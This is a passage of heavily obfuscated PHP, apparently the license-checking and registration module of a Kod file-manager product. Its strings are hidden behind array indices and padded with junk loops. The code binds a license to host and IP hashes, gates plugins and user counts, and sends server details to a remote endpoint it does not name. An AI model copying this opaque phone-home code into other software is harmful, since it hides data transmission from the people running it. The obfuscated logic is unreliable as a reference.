$óÅŞôéÉ[79], $óÅŞôéÉ[80], $óÅŞôéÉ[81], $óÅŞôéÉ[82], $óÅŞôéÉ[83], $óÅŞôéÉ[84], $óÅŞôéÉ[85]); foreach ($Ù˜Æ‚ä‹ as $ëÉ®ÕœÓ) { $¤š€¹‹Ø = $GLOBALS[$óÅŞôéÉ[86]][$óÅŞôéÉ[87]][$ëÉ®ÕœÓ]; $ÆŠÑ™äÉ = $õŸÇìí¶[700]; if (strlen($ÆŠÑ™äÉ) < $õŸÇìí¶[668]) { return; } if (isset($š©ŠÑíÑ[$ëÉ®ÕœÓ])) { $¤š€¹‹Ø = $š©ŠÑíÑ[$ëÉ®ÕœÓ]; } $îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[89]][$ëÉ®ÕœÓ] = $¤š€¹‹Ø; } $‡ÏŠØÜü = $îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[89]][$óÅŞôéÉ[46]]; $–µÁ£º´ = $õŸÇìí¶[701]; unset($îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[90]][$óÅŞôéÉ[91]]); unset($îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[90]][$óÅŞôéÉ[92]]); $Š«¸“š = $õŸÇìí¶[702]; while (strlen($Š«¸“š) < $õŸÇìí¶[703]) { if (!$Š«¸“š) { break; } $Š«¸“š++; } unset($îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[89]][$óÅŞôéÉ[46]]); $Ëìõ›†ª = $õŸÇìí¶[704]; unset($îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[89]][$óÅŞôéÉ[93]]); $îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[89]][$óÅŞôéÉ[94]] = array($óÅŞôéÉ[95] => (int) $‡ÏŠØÜü[$óÅŞôéÉ[96]], $óÅŞôéÉ[97] => (int) _get($‡ÏŠØÜü, $óÅŞôéÉ[98], 0)); $ÏÊˆ›„ = substr(md5($óÅŞôéÉ[99] . get_client_ip() . $š©ŠÑíÑ[$óÅŞôéÉ[100]]), 0, 15); $ç¸Äı…‘ = $õŸÇìí¶[705]; if (strlen($ç¸Äı…‘) < $õŸÇìí¶[677]) { return; } $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[102]] = Mcrypt::encode(Session::sign(), $ÏÊˆ›„, 3600 * 24); $ãáÔûÕ¢ = $õŸÇìí¶[706]; $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[103]] = Action($óÅŞôéÉ[104])->accessToken(); $¢ÊÅı— = $õŸÇìí¶[707]; if (!$¢ÊÅı—) { die; } $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[105]] = md5($_SERVER[$óÅŞôéÉ[106]] . $š©ŠÑíÑ[$óÅŞôéÉ[100]]); $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[107]] = base64_encode(serverInfo()); $Û„àø¾… = $õŸÇìí¶[708]; while (strlen($Û„àø¾…) < $õŸÇìí¶[703]) { if (!$Û„àø¾…) { break; } $Û„àø¾…++; } $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[108]] = $this->sdkl0841f56f; $“±¾Êó– = $õŸÇìí¶[709]; while (strlen($“±¾Êó–) < $õŸÇìí¶[677]) { if (!$“±¾Êó–) { break; } $“±¾Êó–++; } if ($š©ŠÑíÑ[$óÅŞôéÉ[108]] != $óÅŞôéÉ[109]) { $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[110]] = $š©ŠÑíÑ[$óÅŞôéÉ[110]]; $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[111]] = $š©ŠÑíÑ[$óÅŞôéÉ[111]]; $ºáòÄô = rand_string(10) . $this->sdkl0841f56f . rand_string(5); $îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[112]][$óÅŞôéÉ[113]] = $this->icqvb720499e($ºáòÄô, $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[105]]); } if ($this->sdkl0841f56f == $óÅŞôéÉ[109]) { $îÇîŠÀ×[$óÅŞôéÉ[88]][$óÅŞôéÉ[89]][$óÅŞôéÉ[94]][$óÅŞôéÉ[98]] = 0; } $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[114]] = $this->versionPluginFilter(); $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[115]] = _get($this->xhdy2eece3d3, $óÅŞôéÉ[116], $óÅŞôéÉ[6]); if (KodUser::isRoot() && $this->config[$óÅŞôéÉ[117]]) { $îÇîŠÀ×[$óÅŞôéÉ[101]][$óÅŞôéÉ[118]] = WEB_ROOT; } return $îÇîŠÀ×; } private function ocamdef8386a() { $‰í¼¨… =& $_SERVER[÷åé¼î]; $ÎÑ’ê¿Ê =& $_SERVER[Ìõ–Õö]; $öğäüÇä = $_SERVER[$ÎÑ’ê¿Ê[24]] == $ÎÑ’ê¿Ê[119]; $íÎ€ÀÄ = $‰í¼¨…[710]; if (!$íÎ€ÀÄ) { return; } if ($_SERVER[$ÎÑ’ê¿Ê[24]] == $ÎÑ’ê¿Ê[120] && $_GET[$ÎÑ’ê¿Ê[121]] == $ÎÑ’ê¿Ê[122]) { $öğäüÇä = !0; } if ($öğäüÇä) { $¯Òæ×Ë· = array($ÎÑ’ê¿Ê[108] => $this->sdkl0841f56f, $ÎÑ’ê¿Ê[123] => $this->pyave4628032(), $ÎÑ’ê¿Ê[124] => Model($ÎÑ’ê¿Ê[125])->count()); if ($this->sdkl0841f56f != $ÎÑ’ê¿Ê[109]) { $‹Ø×Ü¹ = _get($this->xhdy2eece3d3, $ÎÑ’ê¿Ê[126]); if ($‹Ø×Ü¹) { $¯Òæ×Ë·[$ÎÑ’ê¿Ê[127]] = $‹Ø×Ü¹; $¯Òæ×Ë·[$ÎÑ’ê¿Ê[128]] = strtotime(_get($this->xhdy2eece3d3, $ÎÑ’ê¿Ê[129])); $¯Òæ×Ë·[$ÎÑ’ê¿Ê[130]] = _get($this->xhdy2eece3d3, $ÎÑ’ê¿Ê[116]); } $´ãù„ø› = Model($ÎÑ’ê¿Ê[33])->get($ÎÑ’ê¿Ê[131], $ÎÑ’ê¿Ê[6], !0); if (is_string($´ãù„ø›) && substr($´ãù„ø›, 0, 1) == $ÎÑ’ê¿Ê[132]) { $´ãù„ø› = json_decode_force($´ãù„ø›); } if (is_array($´ãù„ø›) && $´ãù„ø›[$ÎÑ’ê¿Ê[133]] && strstr($´ãù„ø›[$ÎÑ’ê¿Ê[133]], $ÎÑ’ê¿Ê[134])) { $ÁïâÀë = explode($ÎÑ’ê¿Ê[134], $´ãù„ø›[$ÎÑ’ê¿Ê[133]]); $¯Òæ×Ë·[$ÎÑ’ê¿Ê[135]] = $ÁïâÀë[0]; } } $¯Òæ×Ë· = $this->ejpi3bde69a1(json_encode($¯Òæ×Ë·), md5($ÎÑ’ê¿Ê[136])); $˜ÁšÊï¢ = array($ÎÑ’ê¿Ê[137] => $¯Òæ×Ë·); call_user_func(array($ÎÑ’ê¿Ê[138], $ÎÑ’ê¿Ê[139]), $˜ÁšÊï¢); $ˆŸ‹Ç˜ = $‰í¼¨…[711]; if (strlen($ˆŸ‹Ç˜) < $‰í¼¨…[668]) { die; } } if ($this->sdkl0841f56f == $ÎÑ’ê¿Ê[109]) { return; } $¤º¼Êõ“ = array($ÎÑ’ê¿Ê[140], $ÎÑ’ê¿Ê[141], $ÎÑ’ê¿Ê[142], $ÎÑ’ê¿Ê[143], $ÎÑ’ê¿Ê[144], $ÎÑ’ê¿Ê[145]); $²¥ÒúıÙ = $‰í¼¨…[712]; if (strlen($²¥ÒúıÙ) < $‰í¼¨…[668]) { die; } $ÀÙ¥Øœ = Model($ÎÑ’ê¿Ê[33])->get(); $Ş±´¼¨Ï = $‰í¼¨…[713]; if (strlen($Ş±´¼¨Ï) < $‰í¼¨…[668]) { die; } $˜ÁšÊï¢ = array($ÎÑ’ê¿Ê[146] => $ÀÙ¥Øœ[$ÎÑ’ê¿Ê[34]], $ÎÑ’ê¿Ê[147] => $ÀÙ¥Øœ[$ÎÑ’ê¿Ê[35]], $ÎÑ’ê¿Ê[148] => $ÎÑ’ê¿Ê[6]); $Û¿í¨×å = $‰í¼¨…[714]; if (strlen($Û¿í¨×å) < $‰í¼¨…[677]) { die; } foreach ($¤º¼Êõ“ as $—”õ¿²) { if (!isset($ÀÙ¥Øœ[$—”õ¿²]) || !$ÀÙ¥Øœ[$—”õ¿²]) { continue; } $˜ÁšÊï¢[$—”õ¿²] = $ÀÙ¥Øœ[$—”õ¿²]; } call_user_func(array($ÎÑ’ê¿Ê[138], $ÎÑ’ê¿Ê[139]), $˜ÁšÊï¢); } private function ouqk2e04224d() { $ææİ¡ÓŠ =& $_SERVER[÷åé¼î]; $åàò¢¿Ê =& $_SERVER[Ìõ–Õö]; if ($_SERVER[$åàò¢¿Ê[24]] != $åàò¢¿Ê[149]) { return; } if (!KodUser::isRoot()) { die; } $¿çËñ·§ = $GLOBALS[$åàò¢¿Ê[13]]; if (isset($¿çËñ·§[$åàò¢¿Ê[150]])) { $this->vxnkc02ebf2b(); die; } if (isset($¿çËñ·§[$åàò¢¿Ê[151]]) && isset($¿çËñ·§[$åàò¢¿Ê[151]]) == $åàò¢¿Ê[122]) { $¿çËñ·§[$åàò¢¿Ê[152]] = Model($åàò¢¿Ê[33])->get($åàò¢¿Ê[153]); } if (!isset($¿çËñ·§[$åàò¢¿Ê[152]]) || strlen($¿çËñ·§[$åàò¢¿Ê[152]]) != 16) { show_json($åàò¢¿Ê[154] . $¿çËñ·§[$åàò¢¿Ê[152]], !1); } $Œæ‘ßÛ£ = Model($åàò¢¿Ê[33])->get($åàò¢¿Ê[100]); $ù³¨àö½ = md5($_SERVER[$åàò¢¿Ê[106]] . $Œæ‘ßÛ£); $ï¾è±á¾ = $ææİ¡ÓŠ[715]; if (strlen($ï¾è±á¾) < $ææİ¡ÓŠ[670]) { return; } $¿¦»ğªÅ = array($åàò¢¿Ê[152] => $¿çËñ·§[$åàò¢¿Ê[152]], $åàò¢¿Ê[155] => rand_string(16), $åàò¢¿Ê[156] => $åàò¢¿Ê[136], $åàò¢¿Ê[157] => $åàò¢¿Ê[158], $åàò¢¿Ê[159] => $_SERVER[$åàò¢¿Ê[160]], $åàò¢¿Ê[161] => $_SERVER[$åàò¢¿Ê[162]], $åàò¢¿Ê[163] => $_SERVER[$åàò¢¿Ê[164]], $åàò¢¿Ê[105] => $ù³¨àö½, $åàò¢¿Ê[165] => Model($åàò¢¿Ê[33])->get($åàò¢¿Ê[131])); $ş’óÜû„ = $ææİ¡ÓŠ[716]; if (isset($¿çËñ·§[$åàò¢¿Ê[151]]) && isset($¿çËñ·§[$åàò¢¿Ê[151]]) == $åàò¢¿Ê[122]) { $¿¦»ğªÅ[$åàò¢¿Ê[151]] = md5($¿¦»ğªÅ[$åàò¢¿Ê[152]] . $åàò¢¿Ê[166] . $¿¦»ğªÅ[$åàò¢¿Ê[155]]); } if ($¿çËñ·§[$åàò¢¿Ê[167]] == $åàò¢¿Ê[168]) { $ŠæíÇ = $this->ejpi3bde69a1($ù³¨àö½, $åàò¢¿Ê[169]); $ŞÂ©£ƒÄ = $this->icqvb720499e(json_encode($¿¦»ğªÅ), $ù³¨àö½ . $åàò¢¿Ê[170], 3); $ŞÂ©£ƒÄ = $ŞÂ©£ƒÄ . $åàò¢¿Ê[171] . $_SERVER[$åàò¢¿Ê[160]]; $¢ÁíøŸş = $this->upmi7e44c942($åàò¢¿Ê[172] . $ŠæíÇ . $åàò¢¿Ê[173] . $ŞÂ©£ƒÄ, -1); show_json($¢ÁíøŸş, !0); } else { if ($¿çËñ·§[$åàò¢¿Ê[167]] == $åàò¢¿Ê[174]) { $¾á‚ÈœÄ = substr(md5($åàò¢¿Ê[175] . $ù³¨àö½), 12, 15) . $åàò¢¿Ê[176]; $ŞÂ©£ƒÄ = $this->kldi193622cb(trim($¿çËñ·§[$åàò¢¿Ê[177]]), $¾á‚ÈœÄ, 2); $Ñ¬Ó³Õ = json_decode($ŞÂ©£ƒÄ, !0); if (!is_array($Ñ¬Ó³Õ) || !is_array($Ñ¬Ó³Õ[$åàò¢¿Ê[178]]) || $Ñ¬Ó³Õ[$åàò¢¿Ê[152]] != !0) { $–ÈÉëê = $åàò¢¿Ê[179]; $èƒ˜œÊ = $Ñ¬Ó³Õ[$åàò¢¿Ê[178]] ? $åàò¢¿Ê[180] . $Ñ¬Ó³Õ[$åàò¢¿Ê[178]] : $–ÈÉëê; show_json($èƒ˜œÊ, !1); } else { $¿¦»ğªÅ[$åàò¢¿Ê[155]] = $Ñ¬Ó³Õ[$åàò¢¿Ê[178]][$åàò¢¿Ê[181]]; } } else { $Ñ¬Ó³Õ = $this->upmi7e44c942($åàò¢¿Ê[182], $¿¦»ğªÅ, 10); $¶ÈÙõ½ = $ææİ¡ÓŠ[717]; while (strlen($¶ÈÙõ½) < $ææİ¡ÓŠ[677]) { if (!$¶ÈÙõ½) { break; } $¶ÈÙõ½++; } } } if (!is_array($Ñ¬Ó³Õ) || !is_array($Ñ¬Ó³Õ[$åàò¢¿Ê[178]]) || $Ñ¬Ó³Õ[$åàò¢¿Ê[152]] != !0) { $–ÈÉëê = LNG($åàò¢¿Ê[183]); $èƒ˜œÊ = $Ñ¬Ó³Õ[$åàò¢¿Ê[178]] ? $åàò¢¿Ê[180] . $Ñ¬Ó³Õ[$åàò¢¿Ê[178]] : $–ÈÉëê; show_json($èƒ˜œÊ, !1); } $ßñ”ñå† = $Ñ¬Ó³Õ[$åàò¢¿Ê[178]]; $à“ºµ™Ÿ = $this->lhcib762fcf0($ßñ”ñå†[$åàò¢¿Ê[184]]); if (!$à“ºµ™Ÿ || $à“ºµ™Ÿ != $ßñ”ñå†[$åàò¢¿Ê[129]]) { $ÉÓšùÆ = array($åàò¢¿Ê[185] => Model($åàò¢¿Ê[33])->get($åàò¢¿Ê[100]), $åàò¢¿Ê[186] => $_SERVER[$åàò¢¿Ê[106]], $åàò¢¿Ê[187] => this_url(), $åàò¢¿Ê[161] => $_SERVER[$åàò¢¿Ê[162]]); $ŞÂ©£ƒÄ = $this->trbf97e411b9(json_encode($ÉÓšùÆ)); $this->upmi7e44c942($åàò¢¿Ê[188] . $ŞÂ©£ƒÄ); show_json(LNG($åàò¢¿Ê[189]), !0); } $Ò‰ËíŞ = array($åàò¢¿Ê[153] => $ßñ”ñå†[$åàò¢¿Ê[190]], $åàò¢¿Ê[191] => $ßñ”ñå†[$åàò¢¿Ê[192]], $åàò¢¿Ê[193] => rand_string(16), $åàò¢¿Ê[108] => $ßñ”ñå†[$åàò¢¿Ê[194]]); if ($¿¦»ğªÅ[$åàò¢¿Ê[155]]) { $Ò‰ËíŞ[$åàò¢¿Ê[193]] = $¿¦»ğªÅ[$åàò¢¿Ê[155]]; } $§†¢áêê = substr(md5($Ò‰ËíŞ[$åàò¢¿Ê[191]]), 10, 10); $â«Èš÷ú = $§†¢áêê . $Ò‰ËíŞ[$åàò¢¿Ê[108]] . $Ò‰ËíŞ[$åàò¢¿Ê[193]]; $Ò‰ËíŞ[$åàò¢¿Ê[110]] = strrev(base64_encode($this->ejpi3bde69a1($â«Èš÷ú, $åàò¢¿Ê[195]))); $îœ‡Ş©ø = rand_string(16); $‹Ÿ×ºæ = $ææİ¡ÓŠ[718]; while (strlen($‹Ÿ×ºæ) < $ææİ¡ÓŠ[668]) { if (!$‹Ÿ×ºæ) { break; } $‹Ÿ×ºæ++; } $Ìù†ÕÉ = $îœ‡Ş©ø . $Ò‰ËíŞ[$åàò¢¿Ê[108]] . $this->ejpi3bde69a1(md5($Ò‰ËíŞ[$åàò¢¿Ê[153]]), $îœ‡Ş©ø); $Ò‰ËíŞ[$åàò¢¿Ê[111]] = base64_encode(strrev($this->ejpi3bde69a1($Ìù†ÕÉ, $åàò¢¿Ê[196]))); $Ë¶Óõúæ = $ææİ¡ÓŠ[719]; while ($Ë¶Óõúæ < $ææİ¡ÓŠ[668]) { if ($Ë¶Óõúæ >= 0) { break; } $Ë¶Óõúæ++; } if ($ßñ”ñå†[$åàò¢¿Ê[197]] && $ßñ”ñå†[$åàò¢¿Ê[197]] >= 1) { Model($åàò¢¿Ê[33])->setDeep($åàò¢¿Ê[198], $åàò¢¿Ê[122]); } Model($åàò¢¿Ê[33])->set($Ò‰ËíŞ); $³Î•ôŠó = md5($_SERVER[$åàò¢¿Ê[106]] . strrev($Œæ‘ßÛ£) . $Ò‰ËíŞ[$åàò¢¿Ê[191]]); $Ì‘ôêºË = $ææİ¡ÓŠ[720]; if (!$Ì‘ôêºË) { return; } $¾™÷š¶ = strrev(substr($³Î•ôŠó, 10, 16)); $»‚ÈÕô¬ = $ææİ¡ÓŠ[721]; $†»ƒ•£º = $this->icqvb720499e(json_encode($ßñ”ñå†), $³Î•ôŠó); $– ­š¬ = $ææİ¡ÓŠ[722]; if (strlen($– ­š¬) < $ææİ¡ÓŠ[683]) { return; } $àÍÑÂ— = array_to_keyvalue(Model($åàò¢¿Ê[7])->listData(), $åàò¢¿Ê[199]); $£åşÁÁ = $àÍÑÂ—[$åàò¢¿Ê[200]]; $š¨‡±Ì™ = $ææİ¡ÓŠ[723]; while ($š¨‡±Ì™ < $ææİ¡ÓŠ[703]) { if ($š¨‡±Ì™ >= 0) { break; } $š¨‡±Ì™++; } $ÌĞĞ°ºª = array(); $‚Ÿ³ª = $ææİ¡ÓŠ[724]; while ($‚Ÿ³ª < $ææİ¡ÓŠ[677]) { if ($‚Ÿ³ª >= 0) { break; } $‚Ÿ³ª++; } $ÌĞĞ°ºª[$¾™÷š¶] = $†»ƒ•£º; $µ’ŒÍ»ß = $ææİ¡ÓŠ[725]; Model($åàò¢¿Ê[7])->update($£åşÁÁ[$åàò¢¿Ê[201]], array($åàò¢¿Ê[202] => $ÌĞĞ°ºª)); $this->xhdy2eece3d3 = $ßñ”ñå†; $æåÆå¤¹ = $ææİ¡ÓŠ[726]; while ($æåÆå¤¹ < $ææİ¡ÓŠ[670]) { if ($æåÆå¤¹ >= 0) { break; } $æåÆå¤¹++; } $this->sdkl0841f56f = $Ò‰ËíŞ[$åàò¢¿Ê[108]]; $this->licenseRegistSuccess(); Cache::set($åàò¢¿Ê[203] . md5($Œæ‘ßÛ£ . $åàò¢¿Ê[204]), $åàò¢¿Ê[6]); show_json(LNG($åàò¢¿Ê[189]), !0); } private function licenseRegistSuccess() { $Ûòõ„Ü =& $_SERVER[÷åé¼î]; $Ûîâõ­€ =& $_SERVER[Ìõ–Õö]; $í¿å…€½ = Model($Ûîâõ­€[33])->get(); $¢Ğ¨«À± = $Ûòõ„Ü[727]; while (strlen($¢Ğ¨«À±) < $Ûòõ„Ü[703]) { if (!$¢Ğ¨«À±) { break; } $¢Ğ¨«À±++; } if ($í¿å…€½[$Ûîâõ­€[63]] != $Ûîâõ­€[122]) { Model($Ûîâõ­€[33])->set($Ûîâõ­€[63], $Ûîâõ­€[122]); } Action($Ûîâõ­€[205])->initStart(!0); } private function vxnkc02ebf2b() { $ÉºÆ¯Ø„ =& $_SERVER[÷åé¼î]; $ÒÃßìµ÷ =& $_SERVER[Ìõ–Õö]; Model($ÒÃßìµ÷[33])->set(array($ÒÃßìµ÷[153] => $ÒÃßìµ÷[6], $ÒÃßìµ÷[191] => $ÒÃßìµ÷[6], $ÒÃßìµ÷[108] => $ÒÃßìµ÷[109], $ÒÃßìµ÷[110] => $ÒÃßìµ÷[6], $ÒÃßìµ÷[111] => $ÒÃßìµ÷[6])); Model($ÒÃßìµ÷[33])->setDeep($ÒÃßìµ÷[198], $ÒÃßìµ÷[206]); $this->xhdy2eece3d3 = array(); $îŸÜ¡×† = $ÉºÆ¯Ø„[666]; while ($îŸÜ¡×† < $ÉºÆ¯Ø„[683]) { if ($îŸÜ¡×† >= 0) { break; } $îŸÜ¡×†++; } $this->sdkl0841f56f = $ÒÃßìµ÷[109]; $ö¡Å™íø = $ÉºÆ¯Ø„[728]; if (strlen($ö¡Å™íø) < $ÉºÆ¯Ø„[703]) { die; } } private function hocv1163e19c() { $Ñşñ†ù¡ =& $_SERVER[÷åé¼î]; $‘Ş„Ø•Ô =& $_SERVER[Ìõ–Õö]; $_SERVER[$‘Ş„Ø•Ô[162]] = _get($_SERVER, $‘Ş„Ø•Ô[162], APP_HOST); $ùÖûçù = $Ñşñ†ù¡[729]; while ($ùÖûçù < $Ñşñ†ù¡[668]) { if ($ùÖûçù >= 0) { break; } $ùÖûçù++; } $this->sdkl0841f56f = $‘Ş„Ø•Ô[109]; $²±¢¼“² = Model($‘Ş„Ø•Ô[33])->get(); $÷¼øÑ˜§ = $Ñşñ†ù¡[730]; if (strlen($÷¼øÑ˜§) < $Ñşñ†ù¡[703]) { return; } if ($²±¢¼“²[$‘Ş„Ø•Ô[108]] == $‘Ş„Ø•Ô[109]) { return; } $áŒ¹ÓÕ† = Model($‘Ş„Ø•Ô[33])->get($‘Ş„Ø•Ô[100]); $¾ÎÈê²ê = $Ñşñ†ù¡[731]; if (strlen($¾ÎÈê²ê) < $Ñşñ†ù¡[683]) { die; } $¬·Çå“ø = $‘Ş„Ø•Ô[203] . md5($áŒ¹ÓÕ† . $‘Ş„Ø•Ô[204]); $äÏåá¹„ = $Ñşñ†ù¡[732]; $İ³ÎšÂ = Cache::get($¬·Çå“ø); $•÷óƒÁŞ = $Ñşñ†ù¡[733]; while (strlen($•÷óƒÁŞ) < $Ñşñ†ù¡[703]) { if (!$•÷óƒÁŞ) { break; } $•÷óƒÁŞ++; } if (!is_array($İ³ÎšÂ) || !isset($İ³ÎšÂ[$‘Ş„Ø•Ô[207]]) || time() - $İ³ÎšÂ[$‘Ş„Ø•Ô[207]] >= 60) { $İ¿‘†Óœ = Model($‘Ş„Ø•Ô[7])->loadList(); $Œö„šìİ = $İ¿‘†Óœ[$‘Ş„Ø•Ô[200]]; $¯ıÈ½• = md5($_SERVER[$‘Ş„Ø•Ô[106]] . strrev($áŒ¹ÓÕ†) . $²±¢¼“²[$‘Ş„Ø•Ô[191]]); $»áŸ¯Â = strrev(substr($¯ıÈ½•, 10, 16)); $İ³ÎšÂ = $this->kldi193622cb($Œö„šìİ[$‘Ş„Ø•Ô[86]][$»áŸ¯Â], $¯ıÈ½•); $İ³ÎšÂ = json_decode($İ³ÎšÂ, !0); } if (!is_array($İ³ÎšÂ)) { return $this->vxnkc02ebf2b(); } $”Ç‚İöŞ = strtotime($İ³ÎšÂ[$‘Ş„Ø•Ô[129]]); if (time() >= $”Ç‚İöŞ) { return $this->vxnkc02ebf2b(); } if (!isset($İ³ÎšÂ[$‘Ş„Ø•Ô[207]]) || time() - $İ³ÎšÂ[$‘Ş„Ø•Ô[207]] > 20) { $İ³ÎšÂ[$‘Ş„Ø•Ô[207]] = time(); Cache::set($¬·Çå“ø, $İ³ÎšÂ); } $this->xhdy2eece3d3 = $İ³ÎšÂ; $this->sdkl0841f56f = $²±¢¼“²[$‘Ş„Ø•Ô[108]]; $—–ñÙóÚ = $Ñşñ†ù¡[734]; if (strlen($—–ñÙóÚ) < $Ñşñ†ù¡[703]) { die; } } private function txba5fc12a28() { $ÓËÉÙƒ± =& $_SERVER[Ìõ–Õö]; $Æ‹Ãª¯ = $GLOBALS[$ÓËÉÙƒ±[13]]; $ô¦­æàâ = $_SERVER[$ÓËÉÙƒ±[24]]; if ($ô¦­æàâ == $ÓËÉÙƒ±[208] && $this->sdkl0841f56f == $ÓËÉÙƒ±[109]) { show_json(LNG($ÓËÉÙƒ±[209]), !1, $ÓËÉÙƒ±[210]); } $Ø‘‹òæõ = array($ÓËÉÙƒ±[211], $ÓËÉÙƒ±[212]); if (in_array($ô¦­æàâ, $Ø‘‹òæõ)) { if ($this->sdkl0841f56f == $ÓËÉÙƒ±[109] && isset($Æ‹Ãª¯[$ÓËÉÙƒ±[213]])) { show_json(LNG($ÓËÉÙƒ±[209]), !1, $ÓËÉÙƒ±[210]); die; } $îÊÈğ×Ú = $this->pyave4628032(); if ($îÊÈğ×Ú != intval($ÓËÉÙƒ±[214])) { if ($îÊÈğ×Ú <= Model($ÓËÉÙƒ±[125])->count()) { show_json(LNG($ÓËÉÙƒ±[215]), !1, $ÓËÉÙƒ±[210]); die; } } } } private function bmxz9c5a695c() { $ƒ•¥Æ¶ =& $_SERVER[÷åé¼î]; $ê¥¸Ğ­Ç =& $_SERVER[Ìõ–Õö]; $Ú›ØïÒà = array($ê¥¸Ğ­Ç[119], $ê¥¸Ğ­Ç[120]); $ğÛöù¨ = $ƒ•¥Æ¶[735]; if (strlen($ğÛöù¨) < $ƒ•¥Æ¶[703]) { return; } if (!KodUser::isRoot() || !isset($_GET[$ê¥¸Ğ­Ç[216]])) { return; } if (!in_array($_SERVER[$ê¥¸Ğ­Ç[24]], $Ú›ØïÒà)) { return; } $–£Ë§¯ = $ê¥¸Ğ­Ç[217]; $£§¤Šˆ‚ = $ƒ•¥Æ¶[736]; if (strlen($£§¤Šˆ‚) < $ƒ•¥Æ¶[668]) { die; } $–£Ë§¯ = $this->pkyvd3a8d68d($–£Ë§¯, $ê¥¸Ğ­Ç[218]); $÷¤½Í—¾ = $ƒ•¥Æ¶[737]; if (strlen($÷¤½Í—¾) < $ƒ•¥Æ¶[703]) { die; } $‹¥ÛüÑ‚ = stream_context_create(array($ê¥¸Ğ­Ç[219] => array($ê¥¸Ğ­Ç[220] => $ê¥¸Ğ­Ç[221], $ê¥¸Ğ­Ç[222] => 3))); $İò¤Šìö = @file_get_contents($–£Ë§¯, !1, $‹¥ÛüÑ‚); header($ê¥¸Ğ­Ç[223]); if ($İò¤Šìö && strstr($İò¤Šìö, $ê¥¸Ğ­Ç[224])) { echo $İò¤Šìö; } die; } public function lvrx27ee2549($Óëü¹¢„) { $÷¼îé =& $_SERVER[÷åé¼î]; $ı²õˆö =& $_SERVER[Ìõ–Õö]; if ($this->sdkl0841f56f == $ı²õˆö[225]) { return $Óëü¹¢„; } $æ’‡æ¾Ë = $this->versionPluginList(); $Ìä œ®ã = $÷¼îé[738]; if (!$Ìä œ®ã) { return; } $‰¾í²æ = explode($ı²õˆö[226], $this->versionPluginFilter()); $µµğ…á = array(); foreach ($æ’‡æ¾Ë as $·¾Ã‚Õí => $¾æ†›ËŠ) { if ($¾æ†›ËŠ == $ı²õˆö[227] && substr($this->sdkl0841f56f, 0, 1) == $ı²õˆö[227]) { continue; } if (!in_array($·¾Ã‚Õí, $‰¾í²æ)) { $µµğ…á[] = $·¾Ã‚Õí; } } foreach ($µµğ…á as $·¾Ã‚Õí) { unset($Óëü¹¢„[$·¾Ã‚Õí]); $ˆ—Â²éË = $÷¼îé[739]; if (strlen($ˆ—Â²éË) < $÷¼îé[683]) { return; } } return $Óëü¹¢„; } private function versionPluginList() { $ˆ¨”Ğâ“ =& $_SERVER[Ìõ–Õö]; return array($ˆ¨”Ğâ“[228] => $ˆ¨”Ğâ“[227], $ˆ¨”Ğâ“[229] => $ˆ¨”Ğâ“[227], $ˆ¨”Ğâ“[230] => $ˆ¨”Ğâ“[227], $ˆ¨”Ğâ“[231] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[233] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[234] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[235] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[236] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[237] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[238] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[239] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[240] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[241] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[242] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[243] => $ˆ¨”Ğâ“[232], $ˆ¨”Ğâ“[244] => $ˆ¨”Ğâ“[232]); $é‹Óåñ† = $_SERVER[÷åé¼î][740]; } private function versionPluginFilter() { $¡´”¬¡ =& $_SERVER[÷åé¼î]; $ªéô±øü =& $_SERVER[Ìõ–Õö]; if ($this->sdkl0841f56f == $ªéô±øü[109]) { return $ªéô±øü[6]; } $Ú×òæäõ = _get($this->xhdy2eece3d3, $ªéô±øü[245], $ªéô±øü[6]); $Äóä«õ˜ = $¡´”¬¡[741]; if (strlen($Äóä«õ˜) < $¡´”¬¡[668]) { die; } $´¯”Øè¹ = _get($this->xhdy2eece3d3, $ªéô±øü[116], $ªéô±øü[6]); $®ÎÎã› = _get($this->xhdy2eece3d3, $ªéô±øü[246], $ªéô±øü[6]); $òÃÀûµÛ = $¡´”¬¡[742]; if (strlen($òÃÀûµÛ) < $¡´”¬¡[670]) { die; } if ($´¯”Øè¹ > time() && $®ÎÎã› > time()) { $Ç°¹òò› = explode($ªéô±øü[226], $Ú×òæäõ); $Ö³ş†»Â = array_keys($this->versionPluginList()); $Ú×òæäõ = array_merge($Ç°¹òò›, $Ö³ş†»Â); $Ú×òæäõ = implode($ªéô±øü[226], array_filter(array_unique($Ú×òæäõ))); } return $Ú×òæäõ; } private function qekg927e6205() { $À•äˆ¹Ñ =& $_SERVER[Ìõ–Õö]; if ($this->sdkl0841f56f != $À•äˆ¹Ñ[109]) { $GLOBALS[$À•äˆ¹Ñ[86]][$À•äˆ¹Ñ[90]][$À•äˆ¹Ñ[247]] = $À•äˆ¹Ñ[206]; return; } 